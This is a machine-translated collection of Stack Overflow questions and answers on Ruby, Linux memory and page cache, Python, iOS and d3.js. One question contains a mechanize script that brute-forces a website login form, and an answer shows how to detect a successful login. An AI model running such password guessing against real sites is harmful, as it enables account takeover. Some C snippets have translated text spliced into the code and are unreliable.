    implicit def cnv1(v: String): Int = ???
    f(Pair("hi", g _))
  }

  // a more heavy-handed way to fix the type
  class P[A](a: A, fnc: A => _)
  class PS(a: String, fnc: String => _) extends P[String](a, fnc)
  def p[A](ps: P[A]*) = ???
  p(new PS("hi", g _))
} 
```

# ruby-on-rails - PostgreSQL 的 pg gem 不会安装在 OS X 上

> ID：12648022
> 
> 赞同：1
> 
> 时间：2012-09-28T22:09:54.370
> 
> 标签：ruby-on-rails, ruby, postgresql, gem

我已经为此查看了互联网上的所有解决方案，重新安装了所有内容，但仍然没有...当我执行 gem install pg 时，我得到：

> 构建原生扩展。这可能需要一段时间... 错误：安装 pg 时出错：错误：无法构建 gem 原生扩展。
> 
> ```
>  /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/bin/ruby extconf.rb --with-pgsql->lib=/usr/local/Cellar/postgresql/9.2.1/lib --with-pg->config=/usr/local/Cellar/postgresql/9.2.1/bin/pg_config 
> ```
> 
> 使用 /usr/local/Cellar/postgresql/9.2.1/bin/pg_config 中的配置值检查 libpq-fe.h... *** extconf.rb 失败 *** 由于某种原因无法创建 Makefile，可能缺少必要的库和/或标题。检查 mkmf.log 文件以获取更多详细信息。您可能需要配置选项。
> 
> 提供的配置选项： --with-opt-dir --with-opt-include --without-opt-include=${opt-dir}/include --with-opt-lib --without-opt-lib=$ {opt-dir}/lib --with-make-prog --without-make-prog --srcdir=。--curdir --ruby=/Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/bin/ruby --with-pg --without-pg --with-pg-dir --without-pg -dir --with-pg-include --without-pg-include=${pg-dir}/include --with-pg-lib --without-pg-lib=${pg-dir}/lib -- with-pg-config /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:381:in `try_do': The compiler failed to generate an executable file. (RuntimeError) You have to install development tools first. from /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:506:in`try_cpp' 来自 /Users/henriquedubugras/.rvm/rubies /ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:970:in`block in find_header' from /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:790:in`阻止来自 /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:284:in `block (2 levels) in postpone' from /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:254:in`open' 来自 /Users/henriquedubugras/.rvm/rubies /ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:284:in `block in postpone' from /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:254:in`open' 来自 /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9 .1/mkmf.rb:280:in `postpone' from /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:789:in`checks_for' 来自 /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/mkmf.rb:969:in `find_header' from extconf.rb:41:in`'
> 
> Gem 文件将继续安装在 /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/gems/1.9.1/gems/pg-0.14.1 以供检查。结果记录到 /Users/henriquedubugras/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/gems/1.9.1/gems/pg-0.14.1/ext/gem_make.out

我尝试设置 pg_config 路径，安装了我的 xcode，安装了我的 xcode 命令行工具，我的 ruby​​ 版本是 RVM 安装的 1.9.3。

我的 Mac 是 OS X Mountain Lion

多谢你们！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:22:06.767

您缺少 Postgres 客户端库头文件 (libpq-fe.h)。在 Debian 中，该软件包称为 libpq-dev。我根本不知道 Mac 打包，但是如果没有 Mac 存储库，从源代码构建 PG 客户端库就可以了。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-06-07T23:29:38.260

我建议安装 rvm [https://rvm.io/rvm/install](https://rvm.io/rvm/install) 然后运行 ​​rvm 要求。这将安装所有必需的软件包，在安装 rails 之后您可能会丢失“gcc49”，并且以前安装 postgres 很好。我建议使用 postgresapp 或 postgresql。

# c - linux在内存初始化上的高内核cpu使用率

> ID：12648023
> 
> 赞同：11
> 
> 时间：2012-09-28T22:09:56.473
> 
> 标签：c, linux, kernel, cpu, allocation

在服务器上引导我的 java 应用程序时，我遇到了 linux 内核高 CPU 消耗的问题。这个问题只发生在生产中，在开发服务器上一切都是光速的。

**upd9：**关于这个问题有两个问题：

1.  如何解决？- **Nominal Animal**建议同步和删除所有内容，这真的很有帮助。`sudo sh -c 'sync ; echo 3 > /proc/sys/vm/drop_caches ;`作品。**upd12：但确实`sync`足够了。**

2.  **为什么会这样？**- 它对我来说仍然是开放的，我知道将 durty pages 刷新到磁盘会消耗内核 CPU 和 IO 时间，这是正常的。***但是什么是策略，为什么即使是用“C”编写的单线程应用程序我也会在内核空间中 100% 加载所有内核？***

由于**ref-upd10**和**ref-upd11** ，我有一个想法`echo 3 > /proc/sys/vm/drop_caches`不需要解决内存分配缓慢的问题。在启动消耗内存的应用程序***之前***运行“同步”就足够了。明天可能会在生产中尝试这个并在这里发布结果。

**upd10：**丢失 FS 缓存页面案例：

1.  我执行了`cat 10GB.fiel > /dev/null`，然后
2.  `sync`可以肯定的是，没有任何页面（`cat /proc/meminfo |grep ^Dirty`显示 184kb.
3.  检查`cat /proc/meminfo |grep ^Cached`我得到：4GB缓存
4.  运行`int main(char**)`我得到了正常的性能（比如初始化 32MB 的分配数据需要 50 毫秒）。
5.  缓存内存减少到 900MB
6.  测试总结：***我觉得linux把用作FS缓存的页面回收到分配的内存是没有问题的。***

**upd11：**很多脏页案例。

1.  项目清单

2.  `HowMongoDdWorks`我用注释部分运行我的示例`read`，一段时间后

3.  `/proc/meminfo`说2.8GB是`Dirty`，一个3.6GB是`Cached`。

4.  我停下来`HowMongoDdWorks`运行我的`int main(char**)`.

5.  以下是部分结果：

    初始化 15，时间 0.00s x 0 [try 1/part 0] time 1.11s x 1 [try 2/part 0] time 0.04s x 0 [try 1/part 1] time 1.04s x 1 [try 2/part 1] time 0.05s x 0 [尝试 1/第 2 部分] 时间 0.42 秒 x 1 [尝试 2/第 2 部分] 时间 0.04 秒

6.  测试总结：**丢失的 durty pages 显着减慢了对分配内存的首次访问（公平地说，这仅在应用程序总内存开始与整个 OS 内存相当时才开始发生，即如果您有 8 个 16 GB 空闲，它分配1GB没问题，从3GB左右开始减速）。**

现在我设法在我的开发环境中重现了这种情况，所以这里有新的细节。

开发机器配置：

1.  Linux 2.6.32-220.13.1.el6.x86_64 - 科学 Linux 版本 6.1（碳）
2.  内存：15.55 GB
3.  CPU：1 X Intel(R) Core(TM) i5-2300 CPU @ 2.80GHz（4 线程）（物理）

99.9% 的问题是由 FS 缓存中的大量空页引起的。这是在脏页上创建大量的应用程序：

```
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.Random;

/**
 * @author dmitry.mamonov
 *         Created: 10/2/12 2:53 PM
 */
public class HowMongoDdWorks{
    public static void main(String[] args) throws IOException {
        final long length = 10L*1024L*1024L*1024L;
        final int pageSize = 4*1024;
        final int lengthPages = (int) (length/pageSize);
        final byte[] buffer = new byte[pageSize];
        final Random random = new Random();
        System.out.println("Init file");
        final RandomAccessFile raf = new RandomAccessFile("random.file","rw");
        raf.setLength(length);
        int written = 0;
        int readed = 0;
        System.out.println("Test started");
        while(true){
            { //write.
                random.nextBytes(buffer);
                final long randomPageLocation = (long)random.nextInt(lengthPages)*(long)pageSize;
                raf.seek(randomPageLocation);
                raf.write(buffer);
                written++;
            }
            { //read.
                random.nextBytes(buffer);
                final long randomPageLocation = (long)random.nextInt(lengthPages)*(long)pageSize;
                raf.seek(randomPageLocation);
                raf.read(buffer);
                readed++;
            }
            if (written % 1024==0 || readed%1024==0){
                System.out.printf("W %10d R %10d pages\n", written, readed);
            }

        }
    }
} 
```

这是测试应用程序，它会导致内核空间中的 HI（所有内核高达 100%）CPU 负载（与下面相同，但我将再次复制它）。

```
#include<stdlib.h>
#include<stdio.h>
#include<time.h>

int main(char** argv){
   int last = clock(); //remember the time
   for(int i=0;i<16;i++){ //repeat test several times
      int size = 256 * 1024 * 1024;
      int size4=size/4;
      int* buffer = malloc(size); //allocate 256MB of memory
      for(int k=0;k<2;k++){ //initialize allocated memory twice
          for(int j=0;j<size4;j++){ 
              //memory initialization (if I skip this step my test ends in 
              buffer[j]=k; 0.000s
          }
          //printing 
          printf(x "[%d] %.2f\n",k+1, (clock()-last)/(double)CLOCKS_PER_SEC); stat
          last = clock();
      }
   }
   return 0;
} 
```

之前`HowMongoDdWorks`的程序运行时，`int main(char** argv)`将显示如下结果：

```
x [1] 0.23
x [2] 0.19
x [1] 0.24
x [2] 0.19
x [1] 1.30 -- first initialization takes significantly longer
x [2] 0.19 -- then seconds one (6x times slowew)
x [1] 10.94 -- and some times it is 50x slower!!!
x [2] 0.19
x [1] 1.10
x [2] 0.21
x [1] 1.52
x [2] 0.19
x [1] 0.94
x [2] 0.21
x [1] 2.36
x [2] 0.20
x [1] 3.20
x [2] 0.20 -- and the results is totally unstable
... 
```

**我将所有内容都保留在这条线以下仅出于历史目的。**

* * *

**upd1**：开发系统和生产系统都足以进行此测试。 **upd7**：它不是分页，至少我在问题期间没有看到任何存储 IO 活动。

1.  dev ~ 4 核，16 GM RAM，约 8 GB 免费
2.  生产 ~ 12 核，24 GB RAM，~ 16 GB 免费（从 8 到 10 GM 在 FS Cache 下，但没有区别，即使所有 16GM 都是完全免费的，结果相同），这台机器也是由 CPU 加载的，但不是太高了~10%。

**upd8(ref)：**新的测试用例和潜在的解释见尾部。

这是我的测试用例（我也测试了 java 和 python，但是“c”应该是最清楚的）：

```
#include<stdlib.h>
#include<stdio.h>
#include<time.h>

int main(char** argv){
   int last = clock(); //remember the time
   for(int i=0;i<16;i++){ //repeat test several times
      int size = 256 * 1024 * 1024;
      int size4=size/4;
      int* buffer = malloc(size); //allocate 256MB of memory
      for(int k=0;k<2;k++){ //initialize allocated memory twice
          for(int j=0;j<size4;j++){ 
              //memory initialization (if I skip this step my test ends in 
              buffer[j]=k; 0.000s
          }
          //printing 
          printf(x "[%d] %.2f\n",k+1, (clock()-last)/(double)CLOCKS_PER_SEC); stat
          last = clock();
      }
   }
   return 0;
} 
```

开发机器上的输出（部分）：

```
x [1] 0.13 --first initialization takes a bit longer
x [2] 0.12 --then second one, but the different is not significant.
x [1] 0.13
x [2] 0.12
x [1] 0.15
x [2] 0.11
x [1] 0.14
x [2] 0.12
x [1] 0.14
x [2] 0.12
x [1] 0.13
x [2] 0.12
x [1] 0.14
x [2] 0.11
x [1] 0.14
x [2] 0.12 -- and the results is quite stable
... 
```

生产机器上的输出（部分）：

```
x [1] 0.23
x [2] 0.19
x [1] 0.24
x [2] 0.19
x [1] 1.30 -- first initialization takes significantly longer
x [2] 0.19 -- then seconds one (6x times slowew)
x [1] 10.94 -- and some times it is 50x slower!!!
x [2] 0.19
x [1] 1.10
x [2] 0.21
x [1] 1.52
x [2] 0.19
x [1] 0.94
x [2] 0.21
x [1] 2.36
x [2] 0.20
x [1] 3.20
x [2] 0.20 -- and the results is totally unstable
... 
```

在开发机器上运行此测试时，CPU 使用率甚至没有从地面上升，就像所有内核在 htop 中的使用率都低于 5%。

但是在生产机器上运行这个测试，我看到所有内核的 CPU 使用率高达 100%（在 12 核机器上平均负载上升高达 50%），而且都是内核时间。

**upd2：**所有机器都安装了相同的centos linux 2.6，我使用ssh与它们一起工作。

**upd3：** A：它不太可能被交换，在我的测试过程中没有看到任何磁盘活动，并且大量的 RAM 也是可用的。（另外，descriptin 已更新）。– 德米特里 9 分钟前

**upd4：** htop 表示内核的 HI CPU 利用率，al 内核的利用率高达 100%（在产品上）。

**upd5：**初始化完成后CPU利用率是否稳定下来？在我的简单测试中 - 是的。对于实际应用程序，它只会帮助停止其他一切以启动新程序（这是胡说八道）。

我有两个问题：

1.  为什么会这样？

2.  如何解决？

**upd8：**改进的测试和解释。

```
#include<stdlib.h>
#include<stdio.h>
#include<time.h>

int main(char** argv){
    const int partition = 8;
   int last = clock();
   for(int i=0;i<16;i++){
       int size = 256 * 1024 * 1024;
       int size4=size/4;
       int* buffer = malloc(size);
       buffer[0]=123;
       printf("init %d, time %.2fs\n",i, (clock()-last)/(double)CLOCKS_PER_SEC);
       last = clock();
       for(int p=0;p<partition;p++){
            for(int k=0;k<2;k++){
                for(int j=p*size4/partition;j<(p+1)*size4/partition;j++){
                    buffer[j]=k;
                }
                printf("x [try %d/part %d] time %.2fs\n",k+1, p, (clock()-last)/(double)CLOCKS_PER_SEC);
                last = clock();
            }
      }
   }
   return 0;
} 
```

结果如下所示：

```
init 15, time 0.00s -- malloc call takes nothing.
x [try 1/part 0] time 0.07s -- usually first try to fill buffer part with values is fast enough.
x [try 2/part 0] time 0.04s -- second try to fill buffer part with values is always fast.
x [try 1/part 1] time 0.17s
x [try 2/part 1] time 0.05s -- second try...
x [try 1/part 2] time 0.07s
x [try 2/part 2] time 0.05s -- second try...
x [try 1/part 3] time 0.07s
x [try 2/part 3] time 0.04s -- second try...
x [try 1/part 4] time 0.08s
x [try 2/part 4] time 0.04s -- second try...
x [try 1/part 5] time 0.39s -- BUT some times it takes significantly longer then average to fill part of allocated buffer with values.
x [try 2/part 5] time 0.05s -- second try...
x [try 1/part 6] time 0.35s
x [try 2/part 6] time 0.05s -- second try...
x [try 1/part 7] time 0.16s
x [try 2/part 7] time 0.04s -- second try... 
```

我从这次测试中学到的事实。

1.  内存分配本身很快。
2.  第一次访问分配的内存很快（所以它不是惰性缓冲区分配问题）。
3.  我将分配的缓冲区分成几部分（测试中的 8 个）。
4.  并用值0填充每个缓冲区部分，然后用值1填充打印消耗的时间。
5.  第二个缓冲区部分填充总是很快。
6.  但是第一个缓冲区部分的填充总是比第二个填充慢一些（我相信我的内核在第一页访问时完成了一些额外的工作）。
7.  有时，第一次用值填充缓冲区部分需要更长的时间。

我尝试了建议的 anwser，它似乎有帮助。我稍后会重新检查并再次发布结果。

貌似linux将分配的页面映射到durty文件系统缓存页面，将页面一一刷新到磁盘需要很多时间。但总同步工作得很快并消除了问题。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-29T11:23:26.527

跑

```
sudo sh -c 'sync ; echo 3 > /proc/sys/vm/drop_caches ; sync' 
```

在你的开发机器上。这是一种确保缓存为空的安全、非破坏性方法。（运行上述命令*不会*丢失任何数据，即使您碰巧同时保存或写入磁盘。确实很安全。）

然后，确保您没有运行任何 Java 内容，并重新运行上述命令以确保安全。例如，您可以检查是否有任何 Java 正在运行

```
ps axu | sed -ne '/ sed -ne /d; /java/p' 
```

它应该什么也不输出。如果是这样，请先关闭您的 Java 内容。

现在，重新运行您的应用程序测试。现在你的开发机器上是否也会出现同样的减速？

如果您愿意以任何一种方式发表评论，Dmitry，我很乐意进一步探讨这个问题。

编辑补充：我怀疑确实发生了减速，并且是由于 Java 本身引起的大量启动延迟。这是一个非常常见的问题，并且基本上内置于 Java 中，这是其架构的结果。对于较大的应用程序，启动延迟通常只有几分之一秒，无论机器有多快，这仅仅是因为 Java 必须加载和准备类（大多数也是串行的，所以添加内核无济于事）。

换句话说，我认为应该归咎于 Java，而不是 Linux；恰恰相反，因为 Linux 设法通过内核级缓存来减轻开发机器上的延迟——这只是因为你几乎一直在运行这些 Java 组件，所以内核知道缓存它们。

编辑 2：当您的应用程序启动时，查看您的 Java 环境访问哪些文件将非常有用。你可以这样做`strace`：

```
strace -f -o trace.log -q -tt -T -e trace=open COMMAND... 
```

它创建`trace.log`包含`open()`由`COMMAND...`. 要将输出保存到`trace.PID`每个进程的`COMMAND...`启动，请使用

```
strace -f -o trace -ff -q -tt -T -e trace=open COMMAND... 
```

比较你的 dev 和 prod 安装的输出将告诉你它们是否真的等效。其中之一可能有额外或缺失的库，影响启动时间。

如果安装是旧的并且系统分区相当满，那么这些文件可能已经碎片化，导致内核花费更多时间等待 I/O 完成。（请注意，I/O 的*数量*保持不变；如果文件有碎片，则仅完成所需的时间会增加。）您可以使用命令

```
LANG=C LC_ALL=C sed -ne 's|^[^"]* open("\(.*\)", O[^"]*$|\1|p' trace.* \
| LANG=C LC_ALL=C sed -ne 's|^[^"]* open("\(.*\)", O[^"]*$|\1|p' \
| LANG=C LC_ALL=C xargs -r -d '\n' filefrag \
| LANG=C LC_ALL=C awk '(NF > 3 && $NF == "found") { n[$(NF-2)]++ }
  END { for (i in n) printf "%d extents %d files\n", i, n[i] }' \
| sort -g 
```

检查您的应用程序使用的文件的碎片程度；它报告有多少文件只使用一个或多个范围。请注意，它不包括原始可执行文件 ( `COMMAND...`)，仅包括它访问的文件。

如果您只想获取单个命令访问的文件的碎片统计信息，可以使用

```
LANG=C LC_ALL=C strace -f -q -tt -T -e trace=open COMMAND... 2>&1 \
| LANG=C LC_ALL=C sed -ne 's|^[0-9:.]* open("\(.*\)", O[^"]*$|\1|p' \
| LANG=C LC_ALL=C xargs -r filefrag \
| LANG=C LC_ALL=C awk '(NF > 3 && $NF == "found") { n[$(NF-2)]++ }
  END { for (i in n) printf "%d extents %d files\n", i, n[i] }' \
| sort -g 
```

如果问题不是由于缓存引起的，那么我认为这两个安装很可能不是真正等效的。如果是，那么我会检查碎片。之后，我将`-e trace=open`在两个环境中进行完整跟踪（省略 ），以查看差异到底在哪里。

* * *

我相信我现在了解您的问题/情况。

在您的 prod 环境中，内核页面缓存大部分是脏的，即大多数缓存的内容是要写入磁盘的内容。

当您的应用程序分配新页面时，内核仅设置页面映射，它实际上并没有立即提供物理 RAM。这只发生在第一次访问每个页面时。

在第一次访问时，内核首先定位一个空闲页面——通常，一个包含“干净”缓存数据的页面，即从磁盘读取但未修改的数据。然后，它将其清零，以避免进程之间的信息泄漏。（当使用 C 库分配工具`malloc()`等时，库可以使用/重用映射的一部分，而不是直接`mmap()`的函数族。虽然内核确实将页面清除为零，但库可能会“弄脏”它们。使用`mmap()`要获得匿名页面，您确实会将它们归零。）

如果内核手头没有合适的干净页面，它必须首先将一些最旧的脏页面刷新到磁盘。（内核内部有进程将页面刷新到磁盘，并将它们标记为干净，但如果服务器负载使得页面不断变脏，通常希望有大部分脏页面而不是大部分干净页面 - 服务器得到以这种方式完成的工作更多。不幸的是，这也意味着首页访问延迟的增加，您现在会遇到这种情况。）

每页都是`sysconf(_SC_PAGESIZE)`字节长，对齐的。换句话说，`p`当且仅当 时，指针指向页面的开始`((long)p % sysconf(_SC_PAGESIZE)) == 0`。我相信，在大多数情况下，大多数内核实际上确实填充了页面组而不是单个页面，从而增加了第一次访问（每组页面）的延迟。

最后，可能会有一些编译器优化对您的基准测试造成严重破坏。我建议您为基准测试编写一个单独的源文件`main()`，并将每次迭代中完成的实际工作放在一个单独的文件中。分别编译它们，然后将它们链接在一起，以确保编译器不会重新排列时间函数 wrt。实际完成的工作。基本上，在`benchmark.c`：

```
#define _POSIX_C_SOURCE 200809L
#include <time.h>
#include <stdio.h>

/* in work.c, adjust as needed */
void work_init(void);      /* Optional, allocations etc. */
void work(long iteration); /* Completely up to you, including parameters */
void work_done(void);      /* Optional, deallocations etc. */

#define PRIMING    0
#define REPEATS  100

int main(void)
{
    double          wall_seconds[REPEATS];
    struct timespec wall_start, wall_stop;
    long            iteration;

    work_init();

    /* Priming: do you want caches hot? */
    for (iteration = 0L; iteration < PRIMING; iteration++)
        work(iteration);

    /* Timed iterations */
    for (iteration = 0L; iteration < REPEATS; iteration++) {
        clock_gettime(CLOCK_REALTIME, &wall_start);
        work(iteration);
        clock_gettime(CLOCK_REALTIME, &wall_stop);
        wall_seconds[iteration] = (double)(wall_stop.tv_sec - wall_start.tv_sec)
                                + (double)(wall_stop.tv_nsec - wall_start.tv_nsec) / 1000000000.0;
    }

    work_done();

    /* TODO: wall_seconds[0] is the first iteration.
     *       Comparing to successive iterations (assuming REPEATS > 0)
     *       tells you about the initial latency.
    */

    /* TODO: Sort wall_seconds, for easier statistics.
     *       Most reliable value is the median, with half of the
     *       values larger and half smaller.
     *       Personally, I like to discard first and last 15.85%
     *       of the results, to get "one-sigma confidence" interval.
    */

    return 0;
} 
```

实际的数组分配、解除分配和填充（每个重复循环）`work()`在`work.c`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-03T17:33:58.170

当内核用完可用的干净页面时，它必须将脏页面刷新到磁盘。将大量脏页刷新到磁盘看起来像是高 CPU 负载，因为大多数内核端的东西需要一个或多个页面（临时）才能工作。本质上，内核正在等待 I/O 完成，即使用户空间应用程序调用了与 I/O 无关的内核函数。

如果你并行运行一个微基准测试，比如说一个程序不断地反复弄脏一个非常大的映射，并在`__builtin_ia32_rdtsc()`不调用任何系统调用的情况下测量 CPU 时间（如果在 x86 或 x86-64 上使用 GCC），你应该看到这个即使内核似乎正在吃掉“所有”的 CPU 时间，也会获得大量的 CPU 时间。只有当进程调用内部需要一些内存的内核函数（系统调用）时，才会调用“阻塞”，在内核中等待页面刷新以产生新页面。

在运行基准测试时，通常`sudo sh -c 'sync ; echo 3 >/proc/sys/vm/drop_caches ; sync'`在运行基准测试之前运行几次就足够了，以确保在基准测试期间不会出现过度的内存压力。我**从不**在生产环境中使用它。（虽然运行是安全的，即不会丢失数据，但这就像使用大锤杀死蚊子：工作的错误工具。）

当您在生产环境中发现由于内核刷新脏页而导致延迟开始变得过大时（我相信它会以最大设备速度进行，也可能导致应用程序 I/O 速度中断），您可以调整内核脏页刷新机制。基本上，您可以告诉内核更快地将脏页刷新到磁盘，并确保在任何时间点都不会有那么多脏页（如果可能的话）。

[Gregory Smith 在这里](http://www.westnet.com/~gsmith/content/linux-pdflush.htm)写了有关冲洗机制的理论和调整的文章。简而言之，`/proc/sys/vm/`包含您可以修改的内核可调参数。它们在启动时被重置为默认值，但您可以轻松地编写一个简单的初始化脚本，以便`echo`在启动时将所需的值写入文件。如果生产机器上运行的进程执行繁重的 I/O，您可能还会查看文件系统可调参数。至少，您应该`/etc/fstab`使用该`relatime`标志挂载您的文件系统（请参阅 参考资料），以便文件访问时间仅在文件被修改或其状态更改后的第一次访问时更新。

就个人而言，我还为多媒体工作站（如果我现在有的话，也可以用于多媒体服务器）使用具有 1000 Hz 计时器的低延迟可抢占内核。这样的内核在较短的切片中运行用户进程，并且通常提供更好的延迟，尽管最大计算能力略低。如果您的生产服务对延迟敏感，我建议您将生产服务器切换到此类内核。

许多发行版已经提供了这样的内核，但我发现重新编译发行版内核要简单得多，甚至切换到 kernel.org 内核。过程很简单：您需要安装内核开发和工具（在 Debian 变体上，`make-kpkg`非常有用）。要升级内核，您需要获取新的源代码、配置内核（通常使用当前配置作为基础 -- `make oldconfig`）、构建新内核并安装软件包，然后重新启动。大多数人确实发现仅升级硬件比重新编译发行版内核更具成本效益，但我自己发现重新编译内核非常轻松。无论如何，我不会自动重新启动内核升级，因此在重新启动之前添加一个简单的步骤（通过运行单个脚本触发）对我来说并不是太多的努力。

# python - Python，在使用 mechanize 制作“蛮力”方面需要帮助

> ID：12648024
> 
> 赞同：2
> 
> 时间：2012-09-28T22:10:02.227
> 
> 标签：python, url, mechanize, brute-force

我正在玩机械化尝试为我的网站创建蛮力我只是想知道如何检查表单是否已成功提交

至今：

```
import mechanize
import cookielib
import urllib
import HTMLParser
import re
# Browser
br = mechanize.Browser()

# Cookie Jar
cj = cookielib.LWPCookieJar()
br.set_cookiejar(cj)

url = 'http://mywebsite'
pattern = '''Welcome (.*)'''

passwords = ('lol','lol1','correctPassword')

r = br.open(url)
try:
    br.select_form(nr=0)
    br.form['username']='Matt'
    found = False
    i=0
    while not found:
        br.form['password']=passwords[i]
        # here I want to check if br.submit() was successful 
        # than break the loop (or simply make found = True)
        # if not, increment i
        br.submit()
except:
    print "Not Good"
html = br.response().read()
message = re.findall(pattern, html)

parser = HTMLParser.HTMLParser()
print parser.unescape(message) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:50:41.833

我有一个类似的问题。并且没有关于它的文档。如果还不知道。我建议你使用 br.click()

我通过查看网页上的错误元素来检查错误。像这样的东西

```
request = br.click(name='login')
 response = br.open(request)
 mainpage = response.read()
 if mainpage.find('<the error text>')==-1
        #print "Could not login"
        success = True 
```

希望这可以帮助

# ios - UINavigationController 显示但没有返回按钮

> ID：12648027
> 
> 赞同：0
> 
> 时间：2012-09-28T22:10:38.343
> 
> 标签：ios, uinavigationcontroller

在我的代表课上，我有这个-

```
BluenibViewController *mvc = [[BluenibViewController alloc] init];
UINavigationController *unvc = [[UINavigationController alloc] init];
[unvc pushViewController:mvc animated:NO];
[mvc release];
[self.window addSubview:unvc.view];
[self.window makeKeyAndVisible];
return YES; 
```

在我的 BluenibViewController 我有这个方法 -

```
-(IBAction) BookingsViewController:(id)sender

{
    bookingsViewController1 = [[BookingsViewController alloc]
                              initWithNibName:@"BookingsViewController"
                              bundle:nil];

UINavigationController *navController = self.navigationController;
[navController pushViewController:bookingsViewController1 animated:YES];

self.title = @"Bookings";
[self.window makeKeyAndVisible];
[self.view addSubview:bookingsViewController1.view];
[navController release];
[bookingsViewController1 release]; 
```

}

Ob单击此方法我可以转到下一个视图，但导航栏上没有后退按钮。

请指出我正在做的愚蠢错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:57:54.300

我在这里看到很多错误。让我看看我是否不能提供一些服务。

首先，我看到您过度释放了导航控制器 [navController release]；

其次，您应该只需要在整个项目中使窗口键/可见一次。您将 navController 设置为窗口的 rootViewController，使其成为键/可见，然后您就不必再对窗口做任何事情了。不要认为它会破坏任何东西，但您应该删除所有调用以使 key/visible 超出第一个。

最后，推送一个新的视图控制器应该是这样的：

[self.navigationController pushViewController:[[[BookingsViewController alloc] init] autorelease] animated:YES];

你不应该需要任何其他东西来获得你正在寻找的东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T22:20:06.520

您不应该将其添加`unvc.view`为`self.window`. 您应该分配`unvc`为`self.window.rootViewController`：

```
self.window.rootViewController = unvc; 
```

并且您不应添加`bookingsViewController1.view`为`self.view`（在您的`BookingsViewController:`方法中）的子视图。导航控制器将负责`bookingsViewController1.view`在您按下它后进入屏幕。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-01T11:49:49.790

```
self.navigationItem.hidesBackButton =YES; 
```

遵循此代码。希望能帮助到你 ....

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-22T06:58:55.543

它来的有点晚，但在 iOS 8 中你可以这样做：

```
[self.navigationController pushViewController:secondViewController animated:YES]; 
```

# android - 使用 phonegap 流式传输广播 url aac+ 流的任何方式

> ID：12648029
> 
> 赞同：1
> 
> 时间：2012-09-28T22:10:44.693
> 
> 标签：android, cordova, shoutcast

嗨，我试图重现一个流播客 url，这是我在 phonegap 中的代码：

[http://pastebin.ca/2228987](http://pastebin.ca/2228987)

我只是听到可怕的噪音没有音乐我的网址是[http://streaming507.com:8026/](http://streaming507.com:8026/)

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T02:01:50.617

修复了在 Eclipse 中使用原生 android 代码而不是 phonegap。

# javascript - d3.js 中的地理图表

> ID：12648032
> 
> 赞同：6
> 
> 时间：2012-09-28T22:11:19.280
> 
> 标签：javascript, d3.js

我正在寻找一些指导或示例如何在 d3.js 中制作地理图表。我在谷歌图表中需要类似的东西[，](https://developers.google.com/chart/interactive/docs/gallery/geochart)并转向 d3.js，因为我需要一些定制。到目前为止，我找到的最接近的 d3.js 示例是[这个](http://theartofasking.com/question/wjucdg6k)，但那里的代码很长，我希望能找到更简单的东西。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-29T14:52:42.237

您在寻找等值线图吗？这是[最近的 28 行代码示例](http://bl.ocks.org/3306362)。

此示例使用默认投影[d3.geo.albersUsa](https://github.com/mbostock/d3/wiki/Geo-Projections#wiki-albersUsa)，它是美国的复合投影，包括阿拉斯加、夏威夷和波多黎各。如果你想改变可见区域，你可能还想改变投影；[d3.geo.albers](https://github.com/mbostock/d3/wiki/Geo-Projections#wiki-albers)适合 choropleth 地图，因为它是等面积的。阿尔伯斯投影允许您设置[原点](https://github.com/mbostock/d3/wiki/Geo-Projections#wiki-albers_origin)，以便您可以专注于全局的特定部分，并且所有投影都允许您指定[比例](https://github.com/mbostock/d3/wiki/Geo-Projections#wiki-albers_scale)并[平移](https://github.com/mbostock/d3/wiki/Geo-Projections#wiki-albers_translate)以在屏幕上定位地图。

如果您想显示世界地图，我还想看看[扩展投影插件](https://github.com/d3/d3-plugins/tree/master/geo/projection)的持续开发。这增加了许多有用的地图投影，特别是对于世界地图，例如[Winkel Tripel](http://bl.ocks.org/3682676)。D3 的下一个版本还将包括一些令人兴奋的新功能，例如任何投影的 3D 旋转（包括子午线切割；尝试[拖动此示例](http://bl.ocks.org/3788999)）、[自适应重采样](http://bl.ocks.org/3795544)和改进的裁剪。

至于为等值线着色，您当然可以通过将“填充”样式重新定义为数据的函数来为地理特征着色。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-20T21:55:20.023

在充分尊重@mbostock 和他的回答的情况下，我想我会为遇到这个问题的任何人添加一些额外的资源。

